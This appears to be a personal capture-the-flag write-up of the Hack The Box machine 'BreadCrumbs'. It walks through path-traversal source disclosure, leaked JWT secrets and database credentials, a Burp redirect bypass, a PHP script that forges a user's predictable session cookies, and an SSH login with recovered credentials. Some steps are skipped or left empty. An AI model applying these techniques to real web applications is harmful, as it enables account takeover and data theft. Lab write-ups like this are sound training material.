# # `Enumeration` -

![[Pasted image 20210728124324.png]]

### Checking `Check Books` -

![[Pasted image 20210728124538.png]]

### Checking `Search` function -

![[Pasted image 20210728125421.png]]


### Intercepting the `Search` Request -

Each time the user does a search, the site sends the following HTTP request:

![[Pasted image 20210728125802.png]]

- \includes\bookController.php

And when details are requested:

![[Pasted image 20210728130037.png]]

### Changing the book name to something arbitrary -

![[Pasted image 20210728131131.png]]

- The page is prepending `../books/` to what I submit, and the source for the page is running out of `C:\xampp\htdocs\includes\bookController.php`. It’s loading the content with `file_get_contents`, so it will just display the contents of the file, and not execute it as PHP, which means I can leak source, but not use this for code execution.

### Reading \includes\bookController.php -

![[Pasted image 20210728131712.png]]

#  # `bookController.php` -

```php
if($_SERVER['REQUEST_METHOD'] == "POST"){
    $out = "";
    require '..\/db\/db.php';

    $title = "";
    $author = "";

    if($_POST['method'] == 0){
        if($_POST['title'] != ""){
            $title = "%".$_POST['title']."%";
        }
        if($_POST['author'] != ""){
            $author = "%".$_POST['author']."%";
        }
        
    
        $query = "SELECT * FROM books WHERE title LIKE ? OR author LIKE ?";
        $stmt = $con->prepare($query);
        $stmt->bind_param('ss', $title, $author);
        $stmt->execute();
        $res = $stmt->get_result();
        $out = mysqli_fetch_all($res,MYSQLI_ASSOC);
    }

    elseif($_POST['method'] == 1){
        $out = file_get_contents('..\/books\/'.$_POST['book']);
    }

    else{
        $out = false;
    }

    echo json_encode($out);
}"
```


### Gobuster -

```bash
/js (Status: 301)
/includes (Status: 301)
/.html (Status: 403)
/.html.php (Status: 403)
/index.php (Status: 200)
/css (Status: 301)
/.htm (Status: 403)
/.htm.php (Status: 403)
/db (Status: 301)
/php (Status: 301)
/webalizer (Status: 403)
/. (Status: 200)
/portal (Status: 301)
<SNIP>
```

- /db and /portal seems interesting.

### Checking /db -

![[Pasted image 20210728132509.png]]

`/db` has directory listing on (though `db.php` returns an empty page):


# # `Checking /portal` -

![[Pasted image 20210728132840.png]]


### Clicking on `helper` -

![[Pasted image 20210728133055.png]]

Added them to user.txt -

```bash
root@napster:~/Documents/HTB/BreadCrumbs# cat users.txt | awk '{print$1}'
Name
Alex
Emma
Jack
John
Lucas
Olivia
Paul
William
root@napster:~/Documents/HTB/BreadCrumbs# cat users.txt | awk '{print$1}' > user.txt
```

### Sign Up-

![[Pasted image 20210728172937.png]]


### Loggined -

![[Pasted image 20210728173032.png]]

- ### 1. Check Tasks -

![[Pasted image 20210728173417.png]]

- ### 2. Order Pizza -

![[Pasted image 20210728173557.png]]

- ### 3. User Management -

![[Pasted image 20210728173640.png]]

We got more usernames we just addes them to our user list.

- ### 4. File Management -

“File management” just blinks and stays in the same place. Looking in Burp, it’s requesting `/portal/php/files.php`, but getting back a 302 redirect to `../index.php`. However, that 302 has a full page in it, and if I catch the response in Burp, and change `302 Found` to `200 OK`, the page loads:

### Initial Request -

![[Pasted image 20210728175707.png]]

### Modified Request -

Intercept the request and modify the request code to 200  and forward the request-

![[Pasted image 20210728181319.png]]


### Upload Page -

And we were redirected to a upload page :

![[Pasted image 20210728181538.png]]

The upload thing seems juicy but we can't just simply Upload it throws error -

![[Pasted image 20210728181827.png]]


### Taking a Step back `File Read` -

Since we know we can read files lets try to see the logic behind the upload thing.We gonna catch the upload request -

![[Pasted image 20210728185209.png]]

We can see the post request to `/portal/includes/fileController.php`.Now lets grab the file -

![[Pasted image 20210728185501.png]]

# # `/portal/includes/fileController.php` -

```php
function validate(){
    $ret = false;
    $jwt = $_COOKIE['token'];

    $secret_key = '6cb9c1a2786a483ca5e44571dcc5f3bfa298593a6376ad92185c3258acd5591e';
    $ret = JWT::decode($jwt, $secret_key, array('HS256'));   
    return $ret;
}

if($_SERVER['REQUEST_METHOD'] === "POST"){
    $admins = array("paul");
    $user = validate()->data->username;
    if(in_array($user, $admins) && $_SESSION['username'] == "paul"){
        error_reporting(E_ALL & ~E_NOTICE);
        $uploads_dir = '..\/uploads';
        $tmp_name = $_FILES["file"]["tmp_name"];
        $name = $_POST['task'];

        if(move_uploaded_file($tmp_name, "$uploads_dir\/$name")){
            $ret = "Success. Have a great weekend!";
        }     
        else{
            $ret = "Missing file or title :(" ;
        }
    }
    else{
        $ret = "Insufficient privileges. Contact admin or developer to upload code. Note: If you recently registered, please wait for one of our admins to approve it.";
    }

    echo $ret;
}   "
```

- We need to authenticate or create a jwt token as paul plus we also need his session
- We can create token of paul using jwt as we have the secret key but we need to find his session.So we need to look for how session are created.


# # `/db/db.php` -

We also found some creds inside the database but they wern't any useful -

```php
$host="localhost";
$port=3306;
$user="bread";
$password="jUli901";
$dbname="bread";

$con = new mysqli($host, $user, $password, $dbname, $port) or die ('Could not connect to the database server' . mysqli_connect_error());
?>
"
```


# # `../portal/login.php` -

Checking upon the login logic we can see a header of -

```php
HTTP/1.1 200 OK
Date: Wed, 28 Jul 2021 22:14:25 GMT
Server: Apache/2.4.46 (Win64) OpenSSL/1.1.1h PHP/8.0.1
X-Powered-By: PHP/8.0.1
Content-Length: 2969
Connection: close
Content-Type: text/html; charset=UTF-8

"<?php
require_once 'authController.php'; 
```

# # `../portal/authController.php` -

```bash
"<?php 
require 'db\/db.php';
require "cookie.php";
require "vendor\/autoload.php";
use \Firebase\JWT\JWT;

$errors = array();
$username = "";
$userdata = array();
$valid = false;
$IP = $_SERVER['REMOTE_ADDR'];

\/\/if user clicks on login
if($_SERVER['REQUEST_METHOD'] === "POST"){
    if($_POST['method'] == 0){
        $username = $_POST['username'];
        $password = $_POST['password'];
        
        $query = "SELECT username,position FROM users WHERE username=? LIMIT 1";
        $stmt = $con->prepare($query);
        $stmt->bind_param('s', $username);
        $stmt->execute();
        $result = $stmt->get_result();
        while ($row = $result->fetch_array(MYSQLI_ASSOC)){
            array_push($userdata, $row);
        }
        $userCount = $result->num_rows;
        $stmt->close();

        if($userCount > 0){
            $password = sha1($password);
            $passwordQuery = "SELECT * FROM users WHERE password=? AND username=? LIMIT 1";
            $stmt = $con->prepare($passwordQuery);
            $stmt->bind_param('ss', $password, $username);
            $stmt->execute();
            $result = $stmt->get_result();

            if($result->num_rows > 0){
                $valid = true;
            }
            $stmt->close();
        }

        if($valid){
            session_id(makesession($username));
            session_start();

            $secret_key = '6cb9c1a2786a483ca5e44571dcc5f3bfa298593a6376ad92185c3258acd5591e';
            $data = array();

            $payload = array(
                "data" => array(
                    "username" => $username
            ));

            $jwt = JWT::encode($payload, $secret_key, 'HS256');
            
            setcookie("token", $jwt, time() + (86400 * 30), "\/");

            $_SESSION['username'] = $username;
            $_SESSION['loggedIn'] = true;
            if($userdata[0]['position'] == ""){
                $_SESSION['role'] = "Awaiting approval";
            } 
            else{
                $_SESSION['role'] = $userdata[0]['position'];
            }
            
            header("Location: \/portal");
        }

        else{
            $_SESSION['loggedIn'] = false;
            $errors['valid'] = "Username or Password incorrect";
        }
    }

    elseif($_POST['method'] == 1){
        $username=$_POST['username'];
        $password=$_POST['password'];
        $passwordConf=$_POST['passwordConf'];
        
        if(empty($username)){
            $errors['username'] = "Username Required";
        }
        if(strlen($username) < 4){
            $errors['username'] = "Username must be at least 4 characters long";
        }
        if(empty($password)){
            $errors['password'] = "Password Required"; 
        }
        if($password !== $passwordConf){
            $errors['passwordConf'] = "Passwords don't match!"; 
        }

        $userQuery = "SELECT * FROM users WHERE username=? LIMIT 1";
        $stmt = $con->prepare($userQuery);
        $stmt ->bind_param('s',$username);
        $stmt->execute();
        $result = $stmt->get_result();
        $userCount = $result->num_rows;
        $stmt->close();

        if($userCount > 0){
            $errors['username'] = "Username already exists";
        }

        if(count($errors) === 0){
            $password = sha1($password);
            $sql = "INSERT INTO users(username, password, age, position) VALUES (?,?, 0, '')";
            $stmt = $con->prepare($sql);
            $stmt ->bind_param('ss', $username, $password);

            if ($stmt->execute()){
                $user_id = $con->insert_id;
                header('Location: login.php');
            }
            else{
                $_SESSION['loggedIn'] = false;
                $errors['db_error']="Database error: failed to register";
            }
        }
    }
}"
```

- The source looks ok. The code handles checking the DB for username and password hash matches. There’s no SQL injections, as it’s using PHP prepared statements


# # `../portal/cookie.php` -

```bash
"<?php
\/**
 * @param string $username  Username requesting session cookie
 * 
 * @return string $session_cookie Returns the generated cookie
 * 
 * @devteam
 * Please DO NOT use default PHPSESSID; our security team says they are predictable.
 * CHANGE SECOND PART OF MD5 KEY EVERY WEEK
 * *\/
function makesession($username){
    $max = strlen($username) - 1;
    $seed = rand(0, $max);
    $key = "s4lTy_stR1nG_".$username[$seed]."(!528.\/9890";
    $session_cookie = $username.md5($key);

    return $session_cookie;
}"
```

The session cookie is calculated from the username and adding some static characters and taking a hash. This means the number of possible cookies for a given user is the length of their username minus one as we can see from above.

### Creating/Finding cookies for Paul -

Paul gonna be four character -

```php
<?php
function makesession($username, $seed){
    $max = strlen($username) - 1;
    $seed = rand(0, $max);
    $key = "s4lTy_stR1nG_".$username[$seed]."(!528.\/9890";
    $session_cookie = $username.md5($key);

    return $session_cookie;
}
echo makesession("paul",0);
echo "\r\n";
echo makesession("paul",1);
echo "\r\n";
echo makesession("paul",2);
echo "\r\n";
echo makesession("paul",3);
echo "\r\n";
?>
```

Executing it -

```bash
root@napster:~/Documents/HTB/BreadCrumbs# php cookie.php
paul76af6bfe49dec2b67a6ee399a2e6fbed
paul5a85be61b78600e1e81af105cb377653
paul76af6bfe49dec2b67a6ee399a2e6fbed
pauld78f5990e1f882f0d9c2fb6947dee56d
```

### Trying to login via above cookies -




### Creds for ssh -

```bash
{
        "pizza" : "margherita",
        "size" : "large",
        "drink" : "water",
        "card" : "VISA",
        "PIN" : "9890",
        "alternate" : {
                "username" : "juliette",
                "password" : "jUli901./())!",
        }
}
```


juliette - jUli901./())!


With that we can ssh into juliette

# # `SSH` -

```bash
root@napster:~/Documents/HTB/BreadCrumbs# ssh juliette@10.10.10.228
juliette@10.10.10.228's password:
Microsoft Windows [Version 10.0.19041.746]
(c) 2020 Microsoft Corporation. All rights reserved.
juliette@BREADCRUMBS C:\Users\juliette\Desktop>dir
 Directory of C:\Users\juliette\Desktop

01/15/2021  05:04 PM    <DIR>          .
01/15/2021  05:04 PM    <DIR>          ..
12/09/2020  07:27 AM               753 todo.html  
07/28/2021  10:38 PM                34 user.txt   
               2 File(s)            787 bytes     
               2 Dir(s)   6,368,403,456 bytes free

juliette@BREADCRUMBS C:\Users\juliette\Desktop>type user.txt
e2c33ee167e1eb804bda0c9079483850
```